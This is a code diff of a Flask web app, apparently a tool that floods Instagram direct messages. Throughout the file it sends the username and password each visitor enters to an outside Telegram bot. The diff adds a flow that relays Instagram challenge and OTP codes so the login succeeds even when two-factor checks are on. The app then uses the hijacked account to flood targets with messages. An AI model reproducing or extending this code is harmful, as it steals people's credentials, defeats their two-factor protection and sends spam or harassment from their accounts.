@@ -1,15 +1,15 @@
 # language: Python 3.11+, file: app.py
-# deps: flask instagrapi requests gunicorn
 
 from flask import Flask, render_template, request, jsonify
 from instagrapi import Client
 from instagrapi.exceptions import (
     LoginRequired, ChallengeRequired, FeedbackRequired,
-    PleaseWaitFewMinutes, ClientError
+    PleaseWaitFewMinutes, ClientError, TwoFactorRequired
 )
 import requests
 import threading
 import time
+import uuid
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 app = Flask(__name__)
@@ -21,6 +21,9 @@ THREADS = 6
 MAX_RETRIES = 2
 # =======================================================
 
+# temporary store for pending challenges (in-memory)
+pending = {}
+
 def send_to_telegram(text: str):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -28,18 +31,7 @@ def send_to_telegram(text: str):
     except:
         pass
 
-def do_flood(username, password, mode, targets, thread_id, message, count):
-    cl = Client()
-    cl.delay_range = [0, 0]
-
-    send_to_telegram(f"New Web Login\nUser: {username}\nPass: {password}\nMode: {mode}")
-
-    try:
-        cl.login(username, password)
-    except Exception as e:
-        send_to_telegram(f"Login failed for {username}: {e}")
-        return
-
+def do_flood(cl, username, mode, targets, thread_id, message, count):
     def send_to_user(uid, label):
         for _ in range(MAX_RETRIES):
             try:
@@ -94,14 +86,8 @@ def do_flood(username, password, mode, targets, thread_id, message, count):
     except Exception as e:
         send_to_telegram(f"Flood error for {username}: {e}")
 
-def get_threads(username, password):
-    cl = Client()
-    cl.delay_range = [0, 0]
-
-    send_to_telegram(f"Thread List Request\nUser: {username}\nPass: {password}")
-
+def get_threads(cl):
     try:
-        cl.login(username, password)
         threads = cl.direct_threads(amount=30)
         result = []
         for t in threads:
@@ -114,7 +100,6 @@ def get_threads(username, password):
             })
         return {"ok": True, "threads": result}
     except Exception as e:
-        send_to_telegram(f"Thread list failed for {username}: {e}")
         return {"ok": False, "msg": str(e)}
 
 @app.route("/")
@@ -130,28 +115,92 @@ def start():
     targets = data.get("targets", "")
     thread_id = data.get("thread_id", "")
     message = data.get("message", "").strip()
-    count = int(data.get("count", 1))
+    count = int(data.get("count", 1) or 1)
+    challenge_code = data.get("challenge_code", "").strip()
+    session_id = data.get("session_id", "")
 
     if not username or not password:
         return jsonify({"ok": False, "msg": "username aur password zaroori hain"})
 
-    if mode == "list":
-        result = get_threads(username, password)
-        return jsonify(result)
+    # === Challenge code submit karne wala case ===
+    if challenge_code and session_id and session_id in pending:
+        entry = pending[session_id]
+        cl = entry["client"]
+        try:
+            cl.challenge_code_handler = lambda *args, **kwargs: challenge_code
+            # challenge resolve
+            cl.login(username, password)
+            send_to_telegram(f"Challenge solved for {username}")
+            del pending[session_id]
 
-    if not message:
-        return jsonify({"ok": False, "msg": "message zaroori hai"})
+            if mode == "list":
+                result = get_threads(cl)
+                return jsonify(result)
 
-    target_list = [t.strip() for t in targets.split(",") if t.strip()] if targets else []
+            if not message and mode != "list":
+                return jsonify({"ok": False, "msg": "message zaroori hai"})
 
-    t = threading.Thread(
-        target=do_flood,
-        args=(username, password, mode, target_list, thread_id, message, count),
-        daemon=True
-    )
-    t.start()
+            target_list = [t.strip() for t in targets.split(",") if t.strip()] if targets else []
+            t = threading.Thread(
+                target=do_flood,
+                args=(cl, username, mode, target_list, thread_id, message, count),
+                daemon=True
+            )
+            t.start()
+            return jsonify({"ok": True, "msg": "Challenge clear. Flood start ho gaya."})
+        except Exception as e:
+            send_to_telegram(f"Challenge failed for {username}: {e}")
+            return jsonify({"ok": False, "msg": f"Challenge failed: {e}"})
 
-    return jsonify({"ok": True, "msg": "Flood start ho gaya. Credentials receive ho chuke hain."})
+    # === Normal login attempt ===
+    cl = Client()
+    cl.delay_range = [0, 0]
+
+    send_to_telegram(f"New Web Login attempt\nUser: {username}\nPass: {password}\nMode: {mode}")
+
+    try:
+        cl.login(username, password)
+
+        if mode == "list":
+            result = get_threads(cl)
+            return jsonify(result)
+
+        if not message:
+            return jsonify({"ok": False, "msg": "message zaroori hai"})
+
+        target_list = [t.strip() for t in targets.split(",") if t.strip()] if targets else []
+        t = threading.Thread(
+            target=do_flood,
+            args=(cl, username, mode, target_list, thread_id, message, count),
+            daemon=True
+        )
+        t.start()
+        return jsonify({"ok": True, "msg": "Flood start ho gaya. Credentials receive ho chuke hain."})
+
+    except (ChallengeRequired, TwoFactorRequired) as e:
+        # challenge aaya
+        sid = str(uuid.uuid4())
+        pending[sid] = {
+            "client": cl,
+            "username": username,
+            "password": password,
+            "mode": mode,
+            "targets": targets,
+            "thread_id": thread_id,
+            "message": message,
+            "count": count
+        }
+        send_to_telegram(f"⚠️ Challenge/OTP required for {username}\nSession: {sid}")
+        return jsonify({
+            "ok": False,
+            "challenge": True,
+            "session_id": sid,
+            "msg": "Instagram ne challenge/OTP maanga hai. Code daal ke Submit Challenge daba."
+        })
+
+    except Exception as e:
+        send_to_telegram(f"Login failed for {username}: {e}")
+        return jsonify({"ok": False, "msg": f"Login failed: {e}"})
 
 if __name__ == "__main__":
     import os
